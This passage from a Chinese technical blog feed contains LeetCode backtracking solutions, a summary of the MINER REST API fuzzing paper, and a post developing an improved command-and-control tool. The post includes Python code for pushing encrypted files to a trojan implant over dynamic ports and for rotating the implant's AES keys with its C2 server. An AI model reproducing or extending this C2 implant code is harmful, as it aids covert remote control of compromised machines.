path.pop()</span><br></pre></td></tr></table></figure><p>也可以用哈希表 也就是数组去重 只要标记每个位置有没有用过就好了</p><h2 id="332-重新安排行程"><a href="#332-重新安排行程" class="headerlink" title="332. 重新安排行程"></a>332. 重新安排行程</h2><p>给你一份航线列表 tickets ，其中 tickets[i] &#x3D; [fromi, toi] 表示飞机出发和降落的机场地点。请你对该行程进行重新规划排序。<br>所有这些机票都属于一个从 JFK（肯尼迪国际机场）出发的先生，所以该行程必须从 JFK 开始。如果存在多种有效的行程，请你按字典排序返回最小的行程组合。<br>例如，行程 [“JFK”, “LGA”] 与 [“JFK”, “LGB”] 相比就更小，排序更靠前。<br>假定所有机票至少存在一种合理的行程。且所有的机票 必须都用一次 且 只能用一次。<br><img src="/2024/11/29/algorithm/backtracking/image-6.png"><br>输入：tickets &#x3D; [[“MUC”,”LHR”],[“JFK”,”MUC”],[“SFO”,”SJC”],[“LHR”,”SFO”]]<br>输出：[“JFK”,”MUC”,”LHR”,”SFO”,”SJC”]</p><p>主要是构建邻接表，然后进行深度优先搜索</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findItinerary</span>(<span class="params">self, tickets: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="variable language_">self</span>.adj = &#123;&#125;</span><br><span class="line">        tickets.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> u, v <span class="keyword">in</span> tickets:</span><br><span class="line">            <span class="keyword">if</span> u <span class="keyword">in</span> <span class="variable language_">self</span>.adj: <span class="variable language_">self</span>.adj[u].append(v)</span><br><span class="line">            <span class="keyword">else</span>: <span class="variable language_">self</span>.adj[u] = [v]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从JFK出发</span></span><br><span class="line">        <span class="variable language_">self</span>.result = []</span><br><span class="line">        <span class="variable language_">self</span>.dfs(<span class="string">&quot;JFK&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">while</span> s <span class="keyword">in</span> <span class="variable language_">self</span>.adj <span class="keyword">and</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.adj[s]) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 找到s能到哪里,选第一个到的机场</span></span><br><span class="line">            v = <span class="variable language_">self</span>.adj[s][<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">self</span>.adj[s].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="variable language_">self</span>.dfs(v)</span><br><span class="line">        <span class="variable language_">self</span>.result.append(s)</span><br></pre></td></tr></table></figure><h2 id="N皇后"><a href="#N皇后" class="headerlink" title="N皇后"></a>N皇后</h2><p>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。<br>n 皇后问题 研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。<br>给你一个整数 n ，返回所有不同的 n 皇后问题 的解决方案。<br>每一种解法包含一个不同的 n 皇后问题 的棋子放置方案，该方案中 ‘Q’ 和 ‘.’ 分别代表了皇后和空位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solveNQueens</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">generateBoard</span>():</span><br><span class="line">            board = <span class="built_in">list</span>()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                row[queens[i]] = <span class="string">&quot;Q&quot;</span></span><br><span class="line">                board.append(<span class="string">&quot;&quot;</span>.join(row))</span><br><span class="line">                row[queens[i]] = <span class="string">&quot;.&quot;</span></span><br><span class="line">            <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">row: <span class="built_in">int</span></span>):</span><br><span class="line">            <span class="keyword">if</span> row == n:</span><br><span class="line">                board = generateBoard()</span><br><span class="line">                solutions.append(board)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> columns <span class="keyword">or</span> row - i <span class="keyword">in</span> diagonal1 <span class="keyword">or</span> row + i <span class="keyword">in</span> diagonal2:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    queens[row] = i</span><br><span class="line">                    columns.add(i)</span><br><span class="line">                    diagonal1.add(row - i)</span><br><span class="line">                    diagonal2.add(row + i)</span><br><span class="line">                    backtrack(row + <span class="number">1</span>)</span><br><span class="line">                    columns.remove(i)</span><br><span class="line">                    diagonal1.remove(row - i)</span><br><span class="line">                    diagonal2.remove(row + i)</span><br><span class="line"></span><br><span class="line">        solutions = <span class="built_in">list</span>()</span><br><span class="line">        queens = [-<span class="number">1</span>]*n</span><br><span class="line">        columns = <span class="built_in">set</span>()</span><br><span class="line">        diagonal1 = <span class="built_in">set</span>()</span><br><span class="line">        diagonal2 = <span class="built_in">set</span>()</span><br><span class="line">        row = [<span class="string">&quot;.&quot;</span>]*n </span><br><span class="line">        backtrack(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> solutions</span><br></pre></td></tr></table></figure><h2 id="37-解数独"><a href="#37-解数独" class="headerlink" title="37. 解数独"></a>37. 解数独</h2><p>编写一个程序，通过填充空格来解决数独问题。<br>数独的解法需 遵循如下规则：<br>数字 1-9 在每一行只能出现一次。<br>数字 1-9 在每一列只能出现一次。<br>数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。（请参考示例图）<br>数独部分空格内已填入了数字，空白格用 ‘.’ 表示。<br><img src="/2024/11/29/algorithm/backtracking/image-7.png"></p><p>棋盘搜索问题可以使用回溯法暴力搜索，只不过这次我们要做的是二维递归。N皇后问题 (opens new window)是因为每一行每一列只放一个皇后，只需要一层for循环遍历一行，递归来遍历列，然后一行一列确定皇后的唯一位置。<br>本题就不一样了，本题中棋盘的每一个位置都要放一个数字（而N皇后是一行只放一个皇后），并检查数字是否合法，解数独的树形结构要比N皇后更宽更深。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solveSudoku</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Do not return anything, modify board in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        row_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        col_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        box_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                num = board[row][col]</span><br><span class="line">                <span class="keyword">if</span> num == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                row_used[row].add(num)</span><br><span class="line">                col_used[col].add(num)</span><br><span class="line">                box_used[(row // <span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].add(num)</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(<span class="number">0</span>, <span class="number">0</span>, board, row_used, col_used, box_used)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, row, col, board, row_used, col_used, box_used</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        next_row, next_col = (row, col+<span class="number">1</span>) <span class="keyword">if</span> col &lt; <span class="number">8</span> <span class="keyword">else</span> (row + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> board[row][col] != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.backtracking(next_row, next_col, board, row_used, col_used, box_used)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)):</span><br><span class="line">            <span class="keyword">if</span>(num <span class="keyword">not</span> <span class="keyword">in</span> row_used[row] <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> col_used[col] <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>]):</span><br><span class="line">                board[row][col] = num</span><br><span class="line">                row_used[row].add(num)</span><br><span class="line">                col_used[col].add(num)</span><br><span class="line">                box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].add(num)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.backtracking(next_row, next_col, board, row_used, col_used, box_used):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                board[row][col] = <span class="string">&quot;.&quot;</span></span><br><span class="line">                row_used[row].remove(num)</span><br><span class="line">                col_used[col].remove(num)</span><br><span class="line">                box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].remove(num)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回溯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】MINER:A Hybrid Data-Driven Approach for REST API Fuzzing</title>
      <link href="/2024/11/28/PaperReading/MINER/"/>
      <url>/2024/11/28/PaperReading/MINER/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>早期的工作利用先前捕获的API流量和手动定义的规则来生成测试请求。最近，为了更好地自动推断请求类型之间的依赖关系并构造请求序列，提出了REST API模糊测试来测试云服务。通常</p><ol><li>REST API fuzzer的生成策略处理两个主要问题，即如何构造序列模板以及如何在模板中生成每个请求。生成后，fuzzer发送ready-to-use请求序列来测试目标云服务;</li><li>对于序列中的每个请求，云服务首先检查请求是否符合语法和语义。如果不是，它返回一个40x范围的响应。相反，云服务根据请求执行行为，例如，云服务在收到DELETE请求时删除资源。如果云服务行为正常，例如，它根据请求成功地删除了指定的资源，它将返回一个20x Range的响应。否则，云服务行为异常，例如，它试图删除不存在的资源并导致错误状态。然后，它返回一个50x范围的响应;</li><li>fuzzer分析对每个请求的响应，推断云服务的触发状态;</li><li>fuzzer收集触发错误状态的唯一请求序列，例如响应在50x范围内或违反安全规则的序列。按照上述步骤，REST API模糊器将使用生成的请求序列探索可访问的云服务状态。</li></ol><p>现有工作的不足：</p><ol><li>现有的fuzzers通常无法扩展请求序列模板。它们的序列扩展过程经常放弃已构建的序列模板，从空模板开始，这给构建更大长度的序列带来了挑战;</li><li>当在序列模板中生成请求时，现有的fuzzers随机选择请求参数的值。它们无法确定应该更改哪个参数或应该分配什么参数值，即请求上的键更改。</li></ol><p>本文工作的内容：</p><ol><li>面向长度的序列构建:MINER利用历史数据指导序列生成。具体来说，MINER收集在过去的模糊处理过程中已成功生成请求并通过云服务检查的序列模板，作为序列扩展过程的初始模板。然后，MINER利用概率函数在扩展过程中为长度较大的序列模板分配更多的选择次数;</li><li>基于注意模型的请求生成:为了提高请求生成质量，对于每一个通过检查的有效请求，MINER首先收集其参数和使用值作为关键突变。其次，MINER构建了一个注意力模型，该模型是最先进的神经网络模型之一，用于学习关键突变之间的隐含关系。然后，MINER利用该模型生成更多样化的所需键突变组合，从而构建高质量的请求以通过检查，并探索云服务的不同状态;</li><li>请求参数违例检查:MINER实现了一个额外的安全规则检查器来捕获不正确的参数使用错误。通过使用这个检查器，MINER生成一个带有未定义参数的新请求来测试云服务。例如，MINER可以构造一个包含未定义参数的PUT请求，该参数来自POST请求。如果请求得到的响应在50x范围内，MINER推断触发了不正确的参数使用错误，并在本地记录使用的请求，以便进一步分析。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具开发】动态C2改进</title>
      <link href="/2024/11/25/tools/c2improve/"/>
      <url>/2024/11/25/tools/c2improve/</url>
      
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/g0dam/c2Improve">https://github.com/g0dam/c2Improve</a></p><h2 id="动态端口"><a href="#动态端口" class="headerlink" title="动态端口"></a>动态端口</h2><p>动态端口由控制端主动申请 因为任务下发主要是控制端在做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uploadfile</span>(<span class="params">self, host_key: <span class="built_in">str</span>, filepath: <span class="built_in">str</span>, targetfilepath: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.sync_keys()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists(filepath.strip()):  <span class="comment"># 判断要上传的文件是否存在</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;文件不存在！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> targetfilepath.strip()[-<span class="number">1</span>] != <span class="string">&quot;/&quot;</span>:  <span class="comment"># 判断目标路径是否符合 /目录/ 格式</span></span><br><span class="line">            targetfilepath += <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 请求服务器开启文件代理传输服务</span></span><br><span class="line">        random_port = <span class="variable language_">self</span>.openfileserver()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> random_port:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;文件服务开启失败！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.sendcmd(host_key, <span class="string">&quot;uploadfile&quot;</span>, port=random_port)  <span class="comment"># 向服务器发布任务</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发布任务！\n正在等待木马端连接...&quot;</span>)</span><br><span class="line">        sleep(<span class="number">2</span>)  <span class="comment"># 等待两秒以确保文件服务器启动</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 开始文件传输</span></span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((LOCAL_IP, random_port))</span><br><span class="line">        s.send(<span class="string">&quot;c&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 向文件传输代理服务发送身份标识，c 表示我是文件发送方</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 加密文件准备</span></span><br><span class="line">        encrypted_filepath = filepath + <span class="string">&quot;.enc&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> original_file:</span><br><span class="line">                original_data = original_file.read()</span><br><span class="line">            encrypted_data = FileCrypto.encrypt(original_data, host_key)  <span class="comment"># 使用对应的密钥进行加密</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_filepath, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> encrypted_file:</span><br><span class="line">                encrypted_file.write(encrypted_data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件加密完成，保存路径：<span class="subst">&#123;encrypted_filepath&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件加密失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        filename = basename(encrypted_filepath)  <span class="comment"># 获取加密文件的名称</span></span><br><span class="line">        filesize = getsize(encrypted_filepath)  <span class="comment"># 获取加密文件的大小</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收文件服务器发来的对接成功信息</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                isok = loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># &#123;&quot;info&quot;:yes&#125;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(isok, <span class="built_in">dict</span>) <span class="keyword">and</span> isok.get(<span class="string">&quot;info&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;对接成功！正在上传加密文件...&quot;</span>)</span><br><span class="line">            <span class="comment"># 文件头部信息：&#123;&quot;filename&quot;:文件名称,&quot;filesize&quot;:文件大小,&quot;filewritedir&quot;:要写入的目标路径&#125;</span></span><br><span class="line">            filehead = &#123;<span class="string">&quot;filename&quot;</span>: filename, <span class="string">&quot;filesize&quot;</span>: filesize, <span class="string">&quot;filewritedir&quot;</span>: targetfilepath&#125;</span><br><span class="line">            s.send(dumps(&#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="built_in">str</span>(b64encode(dumps(filehead).encode(<span class="string">&quot;utf-8&quot;</span>)))&#125;).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            data = &#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;senddata&quot;</span>&#125;</span><br><span class="line">            s.send(dumps(data).encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 发送就绪信号到接收端</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 上传加密文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_filepath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                <span class="keyword">while</span> filesize &gt; <span class="number">0</span>:</span><br><span class="line">                    chunk = fp.read(<span class="number">1024</span>)</span><br><span class="line">                    filesize -= <span class="built_in">len</span>(chunk)</span><br><span class="line">                    s.sendall(chunk)</span><br><span class="line">                    <span class="keyword">if</span> filesize == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;加密文件上传完成！&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收对端的退出信息</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                data = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功！&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向文件服务器发送退出信息</span></span><br><span class="line">        s.send(dumps(&#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;exit&quot;</span>&#125;).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除加密文件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line">            remove(encrypted_filepath)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;临时加密文件已删除：<span class="subst">&#123;encrypted_filepath&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;删除加密文件失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="动态密钥"><a href="#动态密钥" class="headerlink" title="动态密钥"></a>动态密钥</h2><p>动态密钥由被控端主动发起 每隔一段时间都需要主动更新密钥 用初始密钥加密当前更新后的密钥后发送给服务端 服务端更新任务密钥等信息 同时控制端代码也需要更新 在每次操作之前都获取被控端的最新密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_aes_key</span>(<span class="params">self, key: <span class="built_in">str</span>, aes_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        描述：</span></span><br><span class="line"><span class="string">          客户端生成新的 AES 密钥并告知服务端。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">          key: 当前客户端的唯一标识。</span></span><br><span class="line"><span class="string">          aes_key: 当前 AES 加密密钥。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回：</span></span><br><span class="line"><span class="string">          更新成功返回新 AES 密钥，失败返回 &quot;error&quot;。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 生成新 AES 密钥</span></span><br><span class="line">            new_aes_key = md5((<span class="built_in">str</span>((randint(<span class="number">1</span>, <span class="number">65535</span>))) + <span class="string">&quot;pkcn&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()[:<span class="number">16</span>]</span><br><span class="line">            signature = DataAesCrypt(aes_key, key).encrypt()  <span class="comment"># 使用当前 AES 密钥加密客户端唯一标识</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 向服务端发送更新请求</span></span><br><span class="line">            url = <span class="string">&quot;https://&quot;</span> + IP + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&quot;/updatekey&quot;</span></span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: key,</span><br><span class="line">                <span class="string">&quot;new_aes_key&quot;</span>: new_aes_key,</span><br><span class="line">                <span class="string">&quot;signature&quot;</span>: signature</span><br><span class="line">            &#125;</span><br><span class="line">            rst = post(url=url, json=payload, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> rst.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;AES 密钥更新成功！&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> new_aes_key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;AES 密钥更新失败：&quot;</span>, rst.text)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;更新 AES 密钥时发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span 